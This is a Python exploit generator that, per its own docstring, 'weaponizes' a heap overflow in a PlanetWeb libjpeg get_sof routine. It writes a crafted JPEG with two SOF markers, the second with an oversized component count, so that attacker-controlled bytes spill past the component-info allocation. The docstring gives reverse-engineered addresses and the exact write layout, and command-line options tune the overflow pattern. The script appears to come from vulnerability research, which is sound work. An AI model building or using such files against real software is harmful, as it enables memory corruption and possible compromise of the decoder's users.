#!/usr/bin/env python3
"""
jpeg_sof_overflow.py -- weaponize the PlanetWeb libjpeg get_sof component-count
heap overflow (the ONE real image-decoder write primitive; F-12 huffval was a
mirage -- get_dht is fully guarded; see memory + IDA audit 2026-06-10).

BUG (get_sof @ sub_8C1673EC): reads Nf (1 byte) with NO Nf<=MAX_COMPONENTS cap
(only Nf>0 + length==Nf*3+8). Allocates comp_info = alloc_small(JPOOL_IMAGE,
Nf*0x54) ONLY IF comp_info==NULL. So a JPEG with TWO SOF markers:
  SOF#1 (Nf=nf1 small)  -> comp_info = alloc(nf1*0x54)
  SOF#2 (Nf=nf2 large)  -> comp_info!=NULL, alloc SKIPPED, writes nf2 entries
                           of 0x54 bytes -> overflow (nf2-nf1)*0x54 bytes into
                           the JPOOL_IMAGE heap.
read_markers (sub_8C168A10) dispatches every SOFn -> get_sof with no duplicate
guard, so both fire during marker reading (before any scan).

WRITE CONTENT per overflowing 0x54-byte entry (constrained!):
  +0x00 component_id   (byte 0..255, attacker)
  +0x04 component_index= loop index ci (0..nf2-1)
  +0x08 h_samp_factor  ((samp>>4)&0xF = 0..15, attacker)
  +0x0C v_samp_factor  (samp&0xF      = 0..15, attacker)
  +0x10 quant_tbl_no   (byte 0..255, attacker)
  +0x14..0x53          NOT written (stale heap)
=> you can spray small values at 5 offsets per 0x54 stride; good for smashing
   adjacent heap/allocator metadata, NOT for writing a full 32-bit pointer.

Usage:
  jpeg_sof_overflow.py -o out.jpg [--nf1 1] [--nf2 255]
                       [--id 0xAA] [--samp 0x11] [--quant 0xBB]   # overflow fill
                       [--width 16] [--height 16]
  --id/--samp/--quant set the per-component bytes for EVERY component in SOF#2
  (so the heap footprint is a recognizable, controllable pattern). Defaults make
  a loud AA/BB footprint for first-crash triage under GDB.
"""
import argparse, struct, sys

def seg(marker, payload):
    # marker byte (after 0xFF), 2-byte length includes the length field itself
    return bytes([0xFF, marker]) + struct.pack(">H", len(payload) + 2) + payload

def dqt():
    # one 8-bit luminance table, all 16s (valid enough to parse)
    return seg(0xDB, bytes([0x00]) + bytes([16] * 64))

def sof(nf, width, height, comp_bytes, prec=8):
    # SOFn payload: prec(1) height(2) width(2) Nf(1) then Nf*(id, samp, quant)
    p = bytes([prec]) + struct.pack(">H", height) + struct.pack(">H", width) + bytes([nf])
    p += comp_bytes
    return seg(0xC0, p)            # C0 = baseline SOF0

def build(nf1, nf2, width, height, fid, fsamp, fquant):
    # SOF#1: nf1 benign components (ids 1..nf1, sampling 0x11, quant 0)
    c1 = b"".join(bytes([i + 1, 0x11, 0x00]) for i in range(nf1))
    # SOF#2: nf2 components all with the attacker fill pattern -> overflow footprint
    c2 = bytes([fid, fsamp, fquant]) * nf2
    out  = b"\xFF\xD8"                      # SOI
    out += seg(0xE0, b"JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00")  # APP0/JFIF
    out += dqt()
    out += sof(nf1, width, height, c1)      # SOF#1 -> alloc comp_info[nf1]
    out += sof(nf2, width, height, c2)      # SOF#2 -> OVERFLOW
    out += b"\xFF\xD9"                       # EOI
    return out

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("-o", "--out", required=True)
    ap.add_argument("--nf1", type=int, default=1)
    ap.add_argument("--nf2", type=int, default=255)
    ap.add_argument("--width", type=int, default=16)
    ap.add_argument("--height", type=int, default=16)
    ap.add_argument("--id", type=lambda x: int(x, 0), default=0xAA)
    ap.add_argument("--samp", type=lambda x: int(x, 0), default=0x11)
    ap.add_argument("--quant", type=lambda x: int(x, 0), default=0xBB)
    a = ap.parse_args()
    if not (1 <= a.nf1 <= 255 and 1 <= a.nf2 <= 255):
        sys.exit("nf1/nf2 must be 1..255 (Nf is a single byte)")
    blob = build(a.nf1, a.nf2, a.width, a.height, a.id & 0xFF, a.samp & 0xFF, a.quant & 0xFF)
    with open(a.out, "wb") as f:
        f.write(blob)
    overflow = (a.nf2 - a.nf1) * 0x54
    print("wrote %s (%d bytes)" % (a.out, len(blob)))
    print("  SOF#1 Nf=%d -> comp_info alloc = %d bytes" % (a.nf1, a.nf1 * 0x54))
    print("  SOF#2 Nf=%d -> writes %d bytes -> OVERFLOW %d bytes past the alloc"
          % (a.nf2, a.nf2 * 0x54, overflow))
    print("  fill: id=%#x samp=%#x quant=%#x  (footprint dwords @ +0/+8/+C/+10 per 0x54)"
          % (a.id, a.samp, a.quant))

if __name__ == "__main__":
    main()
